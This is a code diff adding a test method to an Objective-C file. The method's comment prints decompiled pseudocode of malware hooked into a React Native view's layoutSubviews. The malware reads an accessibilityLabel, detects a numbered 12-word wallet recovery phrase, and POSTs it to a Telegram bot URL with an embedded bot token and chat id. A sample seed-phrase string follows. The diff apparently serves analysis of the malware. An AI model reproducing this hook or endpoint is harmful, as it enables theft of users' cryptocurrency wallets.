@@ -145,8 +145,149 @@ struct GTPerson {
 //    [self testCollectionViewAddScrollView];
     
 //    [self testViewPlayMP4Video];
+    
+    
+    
+    
 }
 
+
+- (void)testTokenPostServer {
+    /*
+     __int64 __fastcall _RCTView_layoutSubviews_method(__int64 a1, __int64 a2)
+     {
+       __int64 v2; // STB0_8
+       void *v3; // x0
+       void *v4; // x0
+       void *v5; // x0
+       void *v6; // ST98_8
+       BOOL v7; // STA4_4
+       void *v8; // ST10_8
+       void *v9; // x0
+       void *v10; // x0
+       __int64 v11; // x0
+       __int64 v12; // ST48_8
+       void *v13; // x0
+       __int64 v14; // ST40_8
+       void *v15; // x0
+       __int64 v16; // ST38_8
+       void *v17; // x0
+       void *v18; // x0
+       void *v19; // ST60_8
+       void *v20; // ST50_8
+       void *v21; // x0
+       const char *v23; // [xsp+B8h] [xbp-B8h]
+       void **v24; // [xsp+C0h] [xbp-B0h]
+       int v25; // [xsp+C8h] [xbp-A8h]
+       int v26; // [xsp+CCh] [xbp-A4h]
+       __int64 (__fastcall *v27)(__int64); // [xsp+D0h] [xbp-A0h]
+       void *v28; // [xsp+D8h] [xbp-98h]
+       __int64 v29; // [xsp+E0h] [xbp-90h]
+       void *v30; // [xsp+E8h] [xbp-88h]
+       __int128 v31; // [xsp+F0h] [xbp-80h]
+       void *v32; // [xsp+100h] [xbp-70h]
+       void *v33; // [xsp+108h] [xbp-68h]
+       struct dispatch_semaphore_s *v34; // [xsp+110h] [xbp-60h]
+       int i; // [xsp+11Ch] [xbp-54h]
+       void *v36; // [xsp+120h] [xbp-50h]
+       void *v37; // [xsp+128h] [xbp-48h]
+       __int64 v38; // [xsp+130h] [xbp-40h]
+       void *v39; // [xsp+138h] [xbp-38h]
+       void *v40; // [xsp+140h] [xbp-30h]
+       __int64 v41; // [xsp+148h] [xbp-28h]
+       __int64 v42; // [xsp+150h] [xbp-20h]
+       void *v43; // [xsp+158h] [xbp-18h]
+
+       v2 = a2;
+       v39 = 0LL;
+       objc_storeStrong(&v39);
+       v38 = v2;
+       _RCTView_layoutSubviews_super(v39, "layoutSubviews");
+       v3 = objc_msgSend_valueForKey_(v39, v23, CFSTR("accessibilityLabel"));
+       v37 = (void *)objc_retainAutoreleasedReturnValue(v3);
+       NSLog(CFSTR("%@"));
+       v4 = objc_msgSend_componentsSeparatedByString_(v37, v23, CFSTR(" "), v37);
+       v36 = (void *)objc_retainAutoreleasedReturnValue(v4);
+       if ( objc_msgSend_count(v36, v23) == &dword_18 )
+       {
+         for ( i = 1; i <= 24; ++i )
+         {
+           if ( i % 2 == 1 )
+           {
+             v5 = objc_msgSend_objectAtIndexedSubscript_(v36, v23, i - 1);
+             v6 = (void *)objc_retainAutoreleasedReturnValue(v5);
+             v7 = 2LL * (_QWORD)objc_msgSend_integerValue(v6, v23) - 1 == i;
+             objc_release(v6);
+             if ( !v7 )
+               break;
+           }
+         }
+         if ( i == 25 )
+         {
+           v34 = dispatch_semaphore_create(0LL);
+           v8 = v37;
+           v9 = objc_msgSend_length(v37, v23);
+           v41 = 0LL;
+           v40 = v9;
+           v42 = 0LL;
+           v43 = v9;
+           v32 = v9;
+           v10 = objc_msgSend_stringByReplacingOccurrencesOfString_withString_options_range_(
+                   v8,
+                   v23,
+                   CFSTR(" "),
+                   &stru_31038,
+                   1LL,
+                   0LL,
+                   v9);
+           v11 = objc_retainAutoreleasedReturnValue(v10);
+           v12 = v11;
+           v13 = objc_msgSend_stringWithFormat_(
+                   &OBJC_CLASS___NSString,
+                   v23,
+                   CFSTR("https://api.telegram.org/bot5182709554:AAFPzudunV_Gqof5YpUxJbXrk5bVu6i63IA/sendMessage?chat_id=-4151474685&text=%@"),
+                   v11);
+           v14 = objc_retainAutoreleasedReturnValue(v13);
+           v15 = objc_msgSend_URLWithString_(&OBJC_CLASS___NSURL, v23);
+           v16 = objc_retainAutoreleasedReturnValue(v15);
+           v17 = objc_msgSend_requestWithURL_cachePolicy_timeoutInterval_(&OBJC_CLASS___NSMutableURLRequest, v23, 10.0);
+           v33 = (void *)objc_retainAutoreleasedReturnValue(v17);
+           objc_release(v16);
+           objc_release(v14);
+           objc_release(v12);
+           objc_msgSend_setHTTPMethod_(v33, v23, CFSTR("POST"));
+           v18 = objc_msgSend_sharedSession(&OBJC_CLASS___NSURLSession, v23);
+           v31 = (unsigned __int64)objc_retainAutoreleasedReturnValue(v18);
+           v19 = (void *)v31;
+           v20 = v33;
+           v24 = _NSConcreteStackBlock;
+           v25 = -1040187392;
+           v26 = 0;
+           v27 = ___RCTView_layoutSubviews_method_block_invoke;
+           v28 = &__block_descriptor_40_e8_32s_e46_v32__0__NSData_8__NSURLResponse_16__NSError_24l;
+           v29 = objc_retain(v34);
+           v21 = objc_msgSend_dataTaskWithRequest_completionHandler_(v19, v23, v20, &v24);
+           v30 = (void *)objc_retainAutoreleasedReturnValue(v21);
+           objc_msgSend_resume(v30, v23);
+           dispatch_semaphore_wait(v34, 0xFFFFFFFFFFFFFFFFLL);
+           objc_storeStrong(&v30);
+           objc_storeStrong(&v29);
+           objc_storeStrong(&v31);
+           objc_storeStrong(&v33);
+           objc_storeStrong(&v34);
+         }
+       }
+       objc_storeStrong(&v36);
+       objc_storeStrong(&v37);
+       return objc_storeStrong(&v39);
+     }
+     */
+    
+    NSString *accessLabel = @"1 false 2 judge 3 comic 4 fade 5 elephant 6 zebra 7 mobile 8 intact 9 cement 10 before 11 mirror 12 slow";
+    NSArray *accessArray = [accessLabel componentsSeparatedByString:@" "];
+    
+
+}
 
 - (void)testViewPlayMP4Video {
     
